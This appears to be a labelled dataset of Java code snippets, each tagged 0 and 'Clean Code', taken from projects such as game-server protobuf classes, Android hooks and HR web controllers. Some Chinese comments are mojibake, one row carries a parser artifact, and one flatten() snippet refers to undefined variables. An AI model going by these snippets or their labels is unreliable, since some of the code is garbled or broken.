public static SceneEntityInfo parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new SceneEntityInfo(),input).checkInitialized();
}
public static SceneEntityInfo parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new SceneEntityInfo(),input).checkInitialized();
}
",0,Clean Code
"public String getBytesReserveInfo(){
  return this.bytesReserveInfo;
}
",0,Clean Code
"@Override public void removedNode(final ZyGraphNode<? extends IViewNode<?>> removedNode){
  for (int j=0; j < getChildCount(); ++j) {
    final SelectionHistoryTreeNode leaf=(SelectionHistoryTreeNode)getChildAt(j);
    if (leaf.getNode() == removedNode) {
      ((DefaultTreeModel)getTree().getModel()).removeNodeFromParent(leaf);
      leaf.removeFromParent();
      setUserObject(new SelectionHistoryTreeNodeWrapper(snapshot,snapshotCount));
      break;
    }
  }
}",0,Clean Code
"@Bean public TitanEmbeddingBedrockApi titanEmbeddingApi(){
  return new TitanEmbeddingBedrockApi(TitanEmbeddingModel.TITAN_EMBED_IMAGE_V1.id(),EnvironmentVariableCredentialsProvider.create(),Region.US_EAST_1.id(),new ObjectMapper(),Duration.ofMinutes(2));
}",0,Clean Code
"@Override public void writeTo(ProtoSink output) throws IOException {
  output.writeRawBytes(data);
}
",0,Clean Code
"void setSelected(boolean selected);
",0,Clean Code
"@Override public void init(){
  mPackageManagerService=findClassIfExists(""com.android.server.pm.PackageManagerService"");
  findAndHookMethod(mPackageManagerService,""systemReady"",new MethodHook(){
    @Override protected void after(    MethodHookParam param) throws Throwable {
      Context mContext=(Context)XposedHelpers.getObjectField(param.thisObject,""mContext"");
      Handler mHandler=(Handler)XposedHelpers.getObjectField(param.thisObject,""mHandler"");
      new PrefsChangeObserver(mContext,mHandler,""prefs_key_system_framework_clean_share_apps""){
        @Override public void onChange(        String name){
          mPrefsMap.put(name,PrefsUtils.getSharedStringSetPrefs(mContext,name));
        }
      }
;
    }
  }
);
  MethodHook hook=new MethodHook(){
    @Override @SuppressWarnings(""unchecked"") protected void after(    MethodHookParam param) throws Throwable {
      try {
        if (param.args[0] == null)         return;
        Intent origIntent=(Intent)param.args[0];
        String action=origIntent.getAction();
        if (action == null)         return;
        if (!action.equals(Intent.ACTION_SEND) && !action.equals(Intent.ACTION_SENDTO) && !action.equals(Intent.ACTION_SEND_MULTIPLE))         return;
        Intent intent=(Intent)origIntent.clone();
        if (intent.getDataString() != null && intent.getDataString().contains("":""))         return;
        if (intent.hasExtra(""HyperCeiler"") && intent.getBooleanExtra(""HyperCeiler"",false))         return;
        Set<String> selectedApps=mPrefsMap.getStringSet(""system_framework_clean_share_apps"");
        List<ResolveInfo> resolved=(List<ResolveInfo>)param.getResult();
        ResolveInfo resolveInfo;
        Context mContext=(Context)XposedHelpers.getObjectField(param.thisObject,""mContext"");
        PackageManager pm=mContext.getPackageManager();
        Iterator<ResolveInfo> itr=resolved.iterator();
        while (itr.hasNext()) {
          resolveInfo=itr.next();
          boolean removeOriginal=selectedApps.contains(resolveInfo.activityInfo.packageName) || selectedApps.contains(resolveInfo.activityInfo.packageName + ""|0"");
          boolean removeDual=selectedApps.contains(resolveInfo.activityInfo.packageName + ""|999"");
          boolean hasDual=false;
          try {
            hasDual=XposedHelpers.callMethod(pm,""getPackageInfoAsUser"",resolveInfo.activityInfo.packageName,0,999) != null;
          }
 catch (          Throwable ignore) {
          }
          if ((removeOriginal && !hasDual) || removeOriginal && hasDual && removeDual)           itr.remove();
        }
        param.setResult(resolved);
      }
 catch (      Throwable t) {
        if (!(t instanceof BadParcelableException))         logE(TAG,CleanShareMenu.this.lpparam.packageName,t);
      }
    }
  }
;
  String ActQueryService=isMoreAndroidVersion(33) ? ""com.android.server.pm.ComputerEngine"" : ""com.android.server.pm.PackageManagerService$ComputerEngine"";
  hookAllMethods(ActQueryService,lpparam.classLoader,""queryIntentActivitiesInternal"",hook);
}",0,Clean Code
"public RedisMetadataDAO(JedisProxy jedisProxy,ObjectMapper objectMapper,ConductorProperties conductorProperties,RedisProperties properties){
  super(jedisProxy,objectMapper,conductorProperties,properties);
  refreshTaskDefs();
  long cacheRefreshTime=properties.getTaskDefCacheRefreshInterval().getSeconds();
  Executors.newSingleThreadScheduledExecutor().scheduleWithFixedDelay(this::refreshTaskDefs,cacheRefreshTime,cacheRefreshTime,TimeUnit.SECONDS);
}
",0,Clean Code
"/** 
 * Build the input streams consisting of all-zero input streams and non-zero input streams. When reading from the non-zero input streams, the data is actually read from the original input stream. The size of each input stream is introduced by the sparse headers. NOTE : Some all-zero input streams and non-zero input streams have the size of 0. We DO NOT store the 0 size input streams because they are meaningless.
 */
private void buildSparseInputStreams() throws IOException {
  currentSparseInputStreamIndex=-1;
  sparseInputStreams=new ArrayList<>();
  final List<TarArchiveStructSparse> sparseHeaders=currEntry.getSparseHeaders();
  if (sparseHeaders != null && sparseHeaders.size() > 1) {
    final Comparator<TarArchiveStructSparse> sparseHeaderComparator=(p,q) -> {
      final Long pOffset=p.getOffset();
      final Long qOffset=q.getOffset();
      return pOffset.compareTo(qOffset);
    }
;
    Collections.sort(sparseHeaders,sparseHeaderComparator);
  }
  if (sparseHeaders != null) {
    final InputStream zeroInputStream=new TarArchiveSparseZeroInputStream();
    long offset=0;
    for (    final TarArchiveStructSparse sparseHeader : sparseHeaders) {
      if (sparseHeader.getOffset() == 0 && sparseHeader.getNumbytes() == 0) {
        break;
      }
      if ((sparseHeader.getOffset() - offset) < 0) {
        throw new IOException(""Corrupted struct sparse detected"");
      }
      if ((sparseHeader.getOffset() - offset) > 0) {
        sparseInputStreams.add(new BoundedInputStream(zeroInputStream,sparseHeader.getOffset() - offset));
      }
      if (sparseHeader.getNumbytes() > 0) {
        sparseInputStreams.add(new BoundedInputStream(inputStream,sparseHeader.getNumbytes()));
      }
      offset=sparseHeader.getOffset() + sparseHeader.getNumbytes();
    }
  }
  if (!sparseInputStreams.isEmpty()) {
    currentSparseInputStreamIndex=0;
  }
}",0,Clean Code
"@TruffleBoundary public final boolean startsWith(VmCollection other){
  if (getLength() < other.getLength())   return false;
  var iter=iterator();
  var otherIter=other.iterator();
  while (otherIter.hasNext()) {
    if (!iter.next().equals(otherIter.next()))     return false;
  }
  return true;
}
",0,Clean Code
"Role getRole();
",0,Clean Code
"public GroupNotifyUser getUser1(){
  return this.user1;
}",0,Clean Code
"/** 
 * Update data source connection
 * @param param
 * @return
 */
DataResult<Long> updateWithPermission(DataSourceUpdateParam param);
",0,Clean Code
"/** 
 * 灏嗗璞¤浆鎹负 {@linkplain Category}鍒楄〃銆� <p> 鏀寔鏍煎紡濡備笅锛� </p> <p> <code>""...""</code> </p> <p> <code>{ ... }</code> </p> <p> <code>[ { ... }, ..., ""..."", ... ]</code> </p>
 * @param obj
 * @return
 */
protected List<Category> convertToCategories(Object obj){
  List<Category> categories=new ArrayList<Category>(1);
  convertToCategories(categories,obj);
  return categories;
}
protected void convertToCategories(List<Category> categories,Object obj){
  if (obj == null)   return;
 else   if (obj instanceof Category)   categories.add((Category)obj);
 else   if (obj instanceof String) {
    Category category=createCategory();
    category.setName((String)obj);
    categories.add(category);
  }
 else   if (obj instanceof Map<?,?>) {
    @SuppressWarnings(""unchecked"") Map<String,?> map=(Map<String,?>)obj;
    String name=(String)map.get(Category.PROPERTY_NAME);
    if (name == null)     return;
    Category category=createCategory();
    category.setName(name);
    category.setNameLabel(convertToLabel(map.get(Category.PROPERTY_NAME_LABEL)));
    category.setDescLabel(convertToLabel(map.get(Category.PROPERTY_DESC_LABEL)));
    category.setOrder(convertToInt(map.get(Category.PROPERTY_ORDER),category.getOrder()));
    categories.add(category);
  }
 else   if (obj instanceof Collection<?>) {
    Collection<?> collection=(Collection<?>)obj;
    for (    Object ele : collection)     convertToCategories(categories,ele);
  }
 else   if (obj instanceof Object[]) {
    Object[] array=(Object[])obj;
    for (    Object ele : array)     convertToCategories(categories,ele);
  }
 else   throw new UnsupportedOperationException(""Convert object of type ["" + obj.getClass().getName() + ""] to [""+ Category.class.getName()+ ""] is not supported"");
}",0,Clean Code
"/** 
 * <code>optional double defence = 3;</code>
 * @return this
 */
public AvatarProperty clearDefence(){
  bitField0_&=~0x00000004;
  defence=0D;
  return this;
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(dMJLJNDFOGP);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(kHBDIKDDIIB);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=(1 * rogueMiracleList.length()) + ProtoSink.computeRepeatedMessageSizeNoTag(rogueMiracleList);
  }
  return size;
}",0,Clean Code
"private static String parseAccessDesc(int access){
  if (access == 0) {
    return """";
  }
  StringBuilder r=new StringBuilder();
  if (TypeUtil.isPublic(access)) {
    r.append(""public "");
  }
 else   if (TypeUtil.isProtected(access)) {
    r.append(""protected "");
  }
 else   if (TypeUtil.isPrivate(access)) {
    r.append(""private "");
  }
  if (TypeUtil.isStatic(access)) {
    r.append(""static "");
  }
  if (TypeUtil.isFinal(access)) {
    r.append(""final "");
  }
  if (TypeUtil.isNative(access)) {
    r.append(""native "");
  }
  return r.toString();
}",0,Clean Code
"public String getWinRate(){
  return this.winRate;
}
",0,Clean Code
"@Override public String toString(){
  return ""Embedding {"" + "" vector = "" + Arrays.toString(vector) + "" }"";
}
",0,Clean Code
"/** 
 * 瑙ｆ瀽琛ㄨ揪寮忓弬鏁�
 * @param expression
 * @return
 */
public static Set<String> parseArgs(String expression,String regex){
  Set<String> args=new HashSet<>();
  if (StrUtil.isNotEmpty(expression)) {
    Pattern pattern=Pattern.compile(regex);
    Matcher matcher=pattern.matcher(expression);
    while (matcher.find()) {
      args.add(matcher.group(0));
    }
  }
  return args;
}",0,Clean Code
"@Override public String toString(){
  return toHexString();
}
",0,Clean Code
"int getSlideOutDistance(){
  int distance;
  if (mOrientation == VERTICAL) {
    distance=-getHeight();
    if (getChildCount() > 0) {
      int top=getChildAt(0).getTop();
      if (top < 0) {
        distance=distance + top;
      }
    }
  }
 else {
    if ((mFlag & PF_REVERSE_FLOW_PRIMARY) != 0) {
      distance=getWidth();
      if (getChildCount() > 0) {
        int start=getChildAt(0).getRight();
        if (start > distance) {
          distance=start;
        }
      }
    }
 else {
      distance=-getWidth();
      if (getChildCount() > 0) {
        int start=getChildAt(0).getLeft();
        if (start < 0) {
          distance=distance + start;
        }
      }
    }
  }
  return distance;
}",0,Clean Code
"@Override public LlamaChatResponse chatCompletion(LlamaChatRequest request){
  return this.internalInvocation(request,LlamaChatResponse.class);
}
",0,Clean Code
"/** 
 * @return a new empty instance of {@code GetGachaCeilingCsReq}
 */
public static GetGachaCeilingCsReq newInstance(){
  return new GetGachaCeilingCsReq();
}
",0,Clean Code
"public Builder withStream(boolean stream){
  this.stream=stream;
  return this;
}
",0,Clean Code
"@Override public ChallengeInfo clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  storyInfo.clearQuick();
  return this;
}",0,Clean Code
"/** 
 * 鑾峰彇妯″潡鐨勯樁娈典换鍔�
 * @param moduleId
 * @param version
 * @return
 */
List<StageTask> getByModuleIdAndVersion(Long moduleId,Integer version);
",0,Clean Code
"@PostMapping(""/addEmployee"") @ApiOperation(""鏂板缓鍛樺伐"") @OperateLog(apply=ApplyEnum.HRM,object=OperateObjectEnum.HRM_EMPLOYEE,behavior=BehaviorEnum.SAVE) public Result addEmployee(@Valid @RequestBody AddEmployeeBO employeeVO){
  List<OperationLog> operationLogList=employeeService.add(employeeVO);
  return OperationResult.ok(operationLogList);
}
@PostMapping(""/addEmployeeField"") @ApiOperation(""鏂板缓鑷畾涔夊瓧娈靛憳宸�"") @OperateLog(apply=ApplyEnum.HRM,object=OperateObjectEnum.HRM_EMPLOYEE,behavior=BehaviorEnum.SAVE) public Result addEmployee(@RequestBody AddEmployeeFieldManageBO addEmployeeFieldManageBO){
  List<OperationLog> operationLogList=employeeService.addEmployeeField(addEmployeeFieldManageBO);
  return OperationResult.ok(operationLogList);
}
",0,Clean Code
"public String getJoinGuildSig(){
  return this.mInfo.getJoinGuildSig();
}
",0,Clean Code
"/** 
 * <code>optional bool ACEOIOACIJO = 11;</code>
 * @return the aCEOIOACIJO
 */
public boolean getACEOIOACIJO(){
  return aCEOIOACIJO;
}",0,Clean Code
"/** 
 * Changes the player's current active avatar
 * @param slot The slot of the avatar we are changing to
 * @return true on success
 */
public boolean changeLeader(int slot){
  PlayerLineup lineup=this.getCurrentLineup();
  if (slot >= 0 && slot < lineup.size()) {
    lineup.setLeader(slot);
    return true;
  }
  return false;
}",0,Clean Code
"public RawCall getMatchedCall(){
  return matchedPartnerCall;
}
",0,Clean Code
"public void write(MemoryBuffer buffer,OffsetDateTime obj){
  LocalDateSerializer.writeLocalDate(buffer,obj.toLocalDate());
  LocalTimeSerializer.writeLocalTime(buffer,obj.toLocalTime());
  ZoneOffsetSerializer.writeZoneOffset(buffer,obj.getOffset());
}
",0,Clean Code
"public static int getPollutedPosition(TabbyVariable var){
  if (var != null) {
    String related=null;
    if (var.isPolluted()) {
      related=var.getValue().getRelatedType();
      if (related == null) {
        for (        TabbyVariable element : var.getElements().values()) {
          if (element != null && element.isPolluted()) {
            related=element.getValue().getRelatedType();
            break;
          }
        }
      }
      if (related == null) {
        for (        TabbyVariable field : var.getFieldMap().values()) {
          if (field != null && field.isPolluted()) {
            related=field.getValue().getRelatedType();
            break;
          }
        }
      }
    }
 else     if (var.containsPollutedVar(new ArrayList<>())) {
      related=var.getFirstPollutedVarRelatedType();
    }
    if (related != null) {
      return PositionUtils.getPosition(related);
    }
  }
  return PositionUtils.NOT_POLLUTED_POSITION;
}
",0,Clean Code
"void onWindowSizeChanged(int size);
private void onWindowSizeChanged(){
  int size=sizeNotifierLayout.getHeight();
  if (!keyboardVisible) {
    size-=emojiPadding;
  }
  if (delegate != null) {
    delegate.onWindowSizeChanged(size);
  }
  if (topView != null) {
    if (size < AndroidUtilities.dp(72) + ActionBar.getCurrentActionBarHeight()) {
      if (allowShowTopView) {
        allowShowTopView=false;
        if (needShowTopView) {
          topView.setVisibility(GONE);
          topLineView.setVisibility(GONE);
          topLineView.setAlpha(0.0f);
          resizeForTopView(false);
          topViewEnterProgress=0f;
          topView.setTranslationY(topView.getLayoutParams().height);
        }
      }
    }
 else {
      if (!allowShowTopView) {
        allowShowTopView=true;
        if (needShowTopView) {
          topView.setVisibility(VISIBLE);
          topLineView.setVisibility(VISIBLE);
          topLineView.setAlpha(1.0f);
          resizeForTopView(true);
          topViewEnterProgress=1f;
          topView.setTranslationY(0);
        }
      }
    }
  }
}",0,Clean Code
"/** 
 * <code>optional uint32 buff_id = 12;</code>
 * @return the buffId
 */
public int getBuffId(){
  return buffId;
}",0,Clean Code
"@PostMapping(""/delete/{attendanceGroupId}"") @ApiOperation(""鍒犻櫎鑰冨嫟缁�"") @OperateLog(apply=ApplyEnum.HUMAN_RESOURCE_MANAGEMENT,type=OperateTypeEnum.SETTING,behavior=BehaviorEnum.DELETE,object=OperateObjectEnum.HUMAN_ATTENDANCE_RULE_SETTING) public Result deleteAttendanceGroup(@PathVariable(""attendanceGroupId"") Long attendanceGroupId){
  OperationLog operationLog=attendanceGroupService.deleteAttendanceGroup(attendanceGroupId);
  return OperationResult.ok(operationLog);
}
",0,Clean Code
"@Test public void stringResultShouldBeCorrectlyExtracted(){
  final JsonJqTransform jsonJqTransform=new JsonJqTransform(objectMapper);
  final WorkflowModel workflow=new WorkflowModel();
  final TaskModel task=new TaskModel();
  final Map<String,Object> taskInput=new HashMap<>();
  taskInput.put(""data"",new ArrayList<>());
  taskInput.put(""queryExpression"",""if(.data | length >0) then \""EXISTS\"" else \""CREATE\"" end"");
  task.setInputData(taskInput);
  jsonJqTransform.start(workflow,task,null);
  assertNull(task.getOutputData().get(""error""));
  assertTrue(task.getOutputData().get(""result"") instanceof String);
  String result=(String)task.getOutputData().get(""result"");
  assertEquals(""CREATE"",result);
}",0,Clean Code
"/** 
 * <code>optional uint32 roll_shop_id = 15;</code>
 * @return the rollShopId
 */
public int getRollShopId(){
  return rollShopId;
}",0,Clean Code
"/** 
 * <code>repeated .RelicAffix sub_affix_list = 4;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableSubAffixList()} if you want to modify it.
 * @return internal storage object for reading
 */
public RepeatedMessage<RelicAffixOuterClass.RelicAffix> getSubAffixList(){
  return subAffixList;
}",0,Clean Code
"/** 
 * <code>optional uint32 prop_id = 4;</code>
 * @return the propId
 */
public int getPropId(){
  return propId;
}",0,Clean Code
"@Override public int getId(){
  return (GroupID << 16) + StarCount;
}",0,Clean Code
"/** 
 * <code>repeated .Shop shop_list = 8;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RepeatedMessage<ShopOuterClass.Shop> getMutableShopList(){
  bitField0_|=0x00000004;
  return shopList;
}",0,Clean Code
"@Override public String getSessionId(){
  return null;
}
",0,Clean Code
"@Test public void testZrevrangeByLex(){
  jedisCluster.zrevrangeByLex(""key"",""max"",""min"");
  jedisCluster.zrevrangeByLex(""key"",""max"",""min"",1337,1338);
}",0,Clean Code
"@Override public RelicArchive mergeFrom(final RelicArchive other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasRelicId()) {
    setRelicId(other.relicId);
  }
  if (other.hasSlot()) {
    setSlot(other.slot);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@762201ef!org.eclipse.jdt.core.dom.MethodDeclaration@152fd45",0,Clean Code
"public Integer getDimensions(){
  return this.dimensions;
}
",0,Clean Code
"@PostMapping(""/adminAddEmployee"") @ApiOperation(""浠庣郴缁熺敤鎴锋坊鍔犲憳宸�"") @OperateLog(apply=ApplyEnum.HRM,object=OperateObjectEnum.HRM_EMPLOYEE,behavior=BehaviorEnum.SAVE) public Result adminAddEmployee(@RequestBody List<AddEmployeeBO> employeeList){
  List<OperationLog> operationLogs=employeeService.adminAddEmployee(employeeList);
  return OperationResult.ok(operationLogs);
}
",0,Clean Code
"/** 
 * <code>repeated uint32 text_join_id_list = 3;</code>
 * @param value the textJoinIdList to add
 * @return this
 */
public TextJoinQueryCsReq addTextJoinIdList(final int value){
  bitField0_|=0x00000001;
  textJoinIdList.add(value);
  return this;
}",0,Clean Code
"public int getSizeOfUnmatchedFunctions(final ESide side){
  return metadata.getSizeOfUnmatchedFunctions(side);
}
",0,Clean Code
"@Override public List<HrmEmployee> queryBecomeEmpListByTime(LocalDate time,Collection<Long> employeeIds){
  return employeeMapper.queryBecomeEmpListByTime(time,employeeIds);
}
",0,Clean Code
"MockLVQPackedVectors(LocallyAdaptiveVectorQuantization lvq,List<VectorFloat<?>> vectors,Path testDirectory) throws IOException {
  var ravv=new ListRandomAccessVectorValues(vectors,lvq.globalMean.length());
  var encodedVectors=lvq.encodeAll(ravv);
  var lvqPath=testDirectory.resolve(""lvq"" + System.nanoTime());
  try (var out=TestUtil.openDataOutputStream(lvqPath)){
    for (    var encodedVector : encodedVectors) {
      encodedVector.writePacked(out);
    }
  }
   var dimension=lvq.globalMean.length();
  this.reader=new SimpleMappedReader(lvqPath);
  this.encodedVectorSize=2 * Float.BYTES + ((dimension % 64 == 0) ? dimension : ((dimension / 64 + 1) * 64));
  this.packedVector=vectorTypeSupport.createByteSequence(encodedVectorSize - 2 * Float.BYTES);
}",0,Clean Code
"@TruffleBoundary public final VmCollection flatten(){
  var builder=builder();
  for (  var elem : this) {
    if (elem instanceof Iterable<?>) {
      builder.addAll(iterable);
    }
 else     if (elem instanceof VmListing) {
      listing.forceAndIterateMemberValues((key,member,value) -> {
        builder.add(value);
        return true;
      }
);
    }
 else {
      CompilerDirectives.transferToInterpreter();
      throw new VmExceptionBuilder().evalError(""cannotFlattenCollectionWithNonCollectionElement"").withProgramValue(""Element"",elem).build();
    }
  }
  return builder.build();
}
",0,Clean Code
"@Override public void actionPerformed(final ActionEvent unused){
  dialog.setVisible(false);
  dialog.dispose();
}
",0,Clean Code
"public Builder withIndex(String index){
  Assert.hasText(index,""index must have a value"");
  this.index=index;
  return this;
}
",0,Clean Code
"public void removeListener(){
  graph.getView().getCanvasComponent().removeMouseListener(this);
}
",0,Clean Code
"public static void throwBy(boolean expression,String code,String msg){
  if (expression) {
    if (StrUtil.isBlank(msg)) {
      msg="""";
    }
    throw new XzException(code,msg);
  }
}
",0,Clean Code
"/** 
 * collector use - to get the next set of priority metric group tasks
 * @param metrics Current Metrics
 * @param first   Is it the first time to get
 * @return Metrics TasksReturning null means: the job has been completed, and the collection of all metrics has ended Returning the empty set metrics that there are still metrics collection tasks at the current level that have not been completed,and the next level metrics task collection cannot be performed. The set returned empty means that there are still indicator collection tasks unfinished at the current level, and the task collection at the next level cannot be carried out Returns a set of data representation: get the next set of priority index collcet tasks
 */
public synchronized Set<Metrics> getNextCollectMetrics(Metrics metrics,boolean first){
  if (priorMetrics == null || priorMetrics.isEmpty()) {
    return null;
  }
  Set<Metrics> metricsSet=priorMetrics.peek();
  if (first) {
    if (metricsSet.isEmpty()) {
      log.error(""metrics must has one [availability] metrics at least."");
    }
    return metricsSet;
  }
  if (metrics == null) {
    log.error(""metrics can not null when not first get"");
    return null;
  }
  if (!metricsSet.remove(metrics)) {
    log.warn(""Job {} appId {} app {} metrics {} remove empty error in priorMetrics."",id,monitorId,app,metrics.getName());
  }
  if (metricsSet.isEmpty()) {
    priorMetrics.poll();
    if (priorMetrics.isEmpty()) {
      return null;
    }
    Set<Metrics> source=priorMetrics.peek();
    return new HashSet<>(source);
  }
 else {
    return Collections.emptySet();
  }
}
",0,Clean Code
"public static String getUser(HttpServletRequest request){
  if (request == null) {
    return null;
  }
  return getUser(request.getHeader(API_ACCESS_KEY),request.getHeader(API_SIGNATURE));
}
public static String getUser(String accessKey,String signature){
  if (StringUtils.isBlank(accessKey) || StringUtils.isBlank(signature)) {
    return null;
  }
  UserKey userKey=CommonBeanFactory.getBean(UserKeyService.class).getUserKey(accessKey);
  if (userKey == null) {
    throw new RuntimeException(""invalid accessKey"");
  }
  if (BooleanUtils.isFalse(userKey.getEnable())) {
    throw new RuntimeException(""accessKey is disabled"");
  }
  if (BooleanUtils.isFalse(userKey.getForever())) {
    if (userKey.getExpireTime() == null || userKey.getExpireTime() < System.currentTimeMillis()) {
      throw new RuntimeException(""accessKey is expired"");
    }
  }
  String signatureDecrypt;
  try {
    signatureDecrypt=CodingUtils.aesDecrypt(signature,userKey.getSecretKey(),accessKey);
  }
 catch (  Throwable t) {
    throw new RuntimeException(""invalid signature"");
  }
  String[] signatureArray=StringUtils.split(StringUtils.trimToNull(signatureDecrypt),""|"");
  if (signatureArray.length < 2) {
    throw new RuntimeException(""invalid signature"");
  }
  if (!StringUtils.equals(accessKey,signatureArray[0])) {
    throw new RuntimeException(""invalid signature"");
  }
  long signatureTime;
  try {
    signatureTime=Long.parseLong(signatureArray[signatureArray.length - 1]);
  }
 catch (  Exception e) {
    throw new RuntimeException(e);
  }
  if (Math.abs(System.currentTimeMillis() - signatureTime) > 1800000) {
    throw new RuntimeException(""expired signature"");
  }
  return userKey.getCreateUser();
}",0,Clean Code
"@Override protected String getValueName(BlockEntityType<?> value){
  String name=""Unknown"";
  if (value == BlockEntityType.FURNACE)   name=""Furnace"";
 else   if (value == BlockEntityType.CHEST)   name=""Chest"";
 else   if (value == BlockEntityType.TRAPPED_CHEST)   name=""Trapped Chest"";
 else   if (value == BlockEntityType.ENDER_CHEST)   name=""Ender Chest"";
 else   if (value == BlockEntityType.DISPENSER)   name=""Dispenser"";
 else   if (value == BlockEntityType.DROPPER)   name=""Dropper"";
 else   if (value == BlockEntityType.HOPPER)   name=""Hopper"";
 else   if (value == BlockEntityType.SHULKER_BOX)   name=""Shulker Box"";
 else   if (value == BlockEntityType.BARREL)   name=""Barrel"";
 else   if (value == BlockEntityType.SMOKER)   name=""Smoker"";
 else   if (value == BlockEntityType.BLAST_FURNACE)   name=""Blast Furnace"";
  return name;
}
",0,Clean Code
"@Override public void addInterceptors(InterceptorRegistry registry){
  registry.addInterceptor(userTypeInterceptor()).addPathPatterns(""/**"").excludePathPatterns(""/blog/**"",""/editor/**"",""/error"");
}
",0,Clean Code
"public static String computeCompanyAge(Integer companyAge){
  if (companyAge <= 0) {
    return """";
  }
  int year=companyAge / 365;
  int month=(companyAge % 365) / 30;
  int day=(companyAge % 365) % 30;
  StringBuilder sb=new StringBuilder();
  if (year != 0) {
    sb.append(year).append(""骞�"");
  }
  if (month != 0) {
    sb.append(month).append(""鏈�"");
  }
  if (day != 0) {
    sb.append(day).append(""澶�"");
  }
  return sb.toString();
}",0,Clean Code
"@Override public String toString(){
  return ""MetaStringBytes{"" + ""hashCode="" + hashCode + "", size=""+ bytes.length+ "", bytes=""+ Arrays.toString(bytes)+ '}';
}
",0,Clean Code
"/** 
 * @param method the method to set
 */
public void setMethod(String method){
  this.method=method;
}
",0,Clean Code
"/** 
 * <code>optional string text = 15;</code>
 * @return the text
 */
public String getText(){
  return text.getString();
}",0,Clean Code
"@Override public String toString(){
  return ""DeleteRecruitChannelBO{"" + ""deleteChannelId="" + deleteChannelId + "", changeChannelId=""+ changeChannelId+ '}';
}
",0,Clean Code
"/** 
 * 鎵归噺鍒犻櫎鏂囦欢
 * @param keys key鍒楄〃
 */
public void deleteFileBatch(List<String> keys);
/** 
 * 鎵归噺鍒犻櫎鏂囦欢
 * @param keys       key鍒楄〃
 * @param bucketName 妗跺悕绉�
 */
public void deleteFileBatch(List<String> keys,String bucketName);
",0,Clean Code
"public EVisibilityFilter getVisibilityFilter(){
  if (visibilityCombo.getValue().equals(FILTER_ITEM_VISIBLE)) {
    return EVisibilityFilter.VISIBLE;
  }
 else   if (visibilityCombo.getValue().equals(FILTER_ITEM_INVISIBLE)) {
    return EVisibilityFilter.INVISIBLE;
  }
  return EVisibilityFilter.NONE;
}
",0,Clean Code
"@Test @DisplayName(""it should honor the polling interval from annotations and config"") void threadCountTest() throws NoSuchMethodException {
  var config=new TestWorkerConfig();
  var worker=new MultipleInputParams();
  var worker2=new AnotherAnnotationInput();
  AnnotatedWorkerExecutor annotatedWorkerExecutor=new AnnotatedWorkerExecutor(mock(TaskClient.class),config);
  annotatedWorkerExecutor.addBean(worker);
  annotatedWorkerExecutor.addBean(worker2);
  annotatedWorkerExecutor.startPolling();
  TaskRunnerConfigurer runner=annotatedWorkerExecutor.getTaskRunner();
  assertNotNull(runner);
  Map<String,Integer> taskThreadCount=runner.getTaskThreadCount();
  assertNotNull(taskThreadCount);
  assertEquals(3,taskThreadCount.get(""test_1""));
  assertEquals(1,taskThreadCount.get(""test_2""));
  annotatedWorkerExecutor.shutdown();
  config.setThreadCount(""test_2"",2);
  annotatedWorkerExecutor=new AnnotatedWorkerExecutor(mock(TaskClient.class),config);
  annotatedWorkerExecutor.addBean(worker);
  annotatedWorkerExecutor.addBean(worker2);
  annotatedWorkerExecutor.startPolling();
  runner=annotatedWorkerExecutor.getTaskRunner();
  taskThreadCount=runner.getTaskThreadCount();
  assertNotNull(taskThreadCount);
  assertEquals(3,taskThreadCount.get(""test_1""));
  assertEquals(2,taskThreadCount.get(""test_2""));
}",0,Clean Code
"@Override public boolean equals(Object obj){
  if (this == obj)   return true;
  if (obj == null)   return false;
  if (getClass() != obj.getClass())   return false;
  VertexAiGeminiChatOptions other=(VertexAiGeminiChatOptions)obj;
  if (stopSequences == null) {
    if (other.stopSequences != null)     return false;
  }
 else   if (!stopSequences.equals(other.stopSequences))   return false;
  if (temperature == null) {
    if (other.temperature != null)     return false;
  }
 else   if (!temperature.equals(other.temperature))   return false;
  if (topP == null) {
    if (other.topP != null)     return false;
  }
 else   if (!topP.equals(other.topP))   return false;
  if (topK == null) {
    if (other.topK != null)     return false;
  }
 else   if (!topK.equals(other.topK))   return false;
  if (candidateCount == null) {
    if (other.candidateCount != null)     return false;
  }
 else   if (!candidateCount.equals(other.candidateCount))   return false;
  if (maxOutputTokens == null) {
    if (other.maxOutputTokens != null)     return false;
  }
 else   if (!maxOutputTokens.equals(other.maxOutputTokens))   return false;
  if (model == null) {
    if (other.model != null)     return false;
  }
 else   if (!model.equals(other.model))   return false;
  if (functionCallbacks == null) {
    if (other.functionCallbacks != null)     return false;
  }
 else   if (!functionCallbacks.equals(other.functionCallbacks))   return false;
  if (functions == null) {
    if (other.functions != null)     return false;
  }
 else   if (!functions.equals(other.functions))   return false;
  return true;
}
",0,Clean Code
"public static void normalizeFlags(TLRPC.Message message){
  if (message.from_id == null) {
    message.flags&=~256;
  }
  if (message.from_id == null) {
    message.flags&=~4;
  }
  if (message.reply_to == null) {
    message.flags&=~8;
  }
  if (message.media == null) {
    message.flags&=~512;
  }
  if (message.reply_markup == null) {
    message.flags&=~64;
  }
  if (message.replies == null) {
    message.flags&=~8388608;
  }
  if (message.reactions == null) {
    message.flags&=~1048576;
  }
}",0,Clean Code
"/** 
 * @param mouseButton one of the MOUSE_* constants of this class.
 */
public void sendMouseEvent(int mouseButton,int column,int row,boolean pressed){
  if (column < 1)   column=1;
  if (column > mColumns)   column=mColumns;
  if (row < 1)   row=1;
  if (row > mRows)   row=mRows;
  if (mouseButton == MOUSE_LEFT_BUTTON_MOVED && !isDecsetInternalBitSet(DECSET_BIT_MOUSE_TRACKING_BUTTON_EVENT)) {
  }
 else   if (isDecsetInternalBitSet(DECSET_BIT_MOUSE_PROTOCOL_SGR)) {
